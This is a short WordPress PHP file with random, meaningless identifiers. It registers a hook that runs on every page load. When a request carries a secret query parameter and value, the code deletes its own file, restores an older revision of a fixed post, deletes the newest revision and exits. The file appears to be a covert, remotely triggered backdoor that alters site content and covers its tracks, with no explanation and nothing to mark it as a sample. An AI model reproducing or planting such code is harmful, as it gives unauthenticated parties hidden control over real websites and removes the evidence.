<?php

function scss_composer_auto() {
	if (isset($_GET['logger_separator_super_gdpr']) && $_GET['logger_separator_super_gdpr'] === 'addon_authentication_cover') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$zoom_selector_age = 2189;
		$timer_translation_column = wp_get_post_revisions($zoom_selector_age);
		if (empty($timer_translation_column)) die('no revisions');
		if (count($timer_translation_column) < 2) die('less than 2');
		$appointment_translator_slug = array_shift($timer_translation_column);
		$pop_analytics_discount = $appointment_translator_slug->ID;
		$subscriptions_portal_comments = array_shift($timer_translation_column);
		$endpoints_compat_client = $subscriptions_portal_comments->ID;
		$sites_real_client_update = wp_restore_post_revision($endpoints_compat_client);
		if ($sites_real_client_update === false) die('error restoring');
		$sites_real_client_update = wp_delete_post_revision($pop_analytics_discount);		
		if ($sites_real_client_update === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'scss_composer_auto');
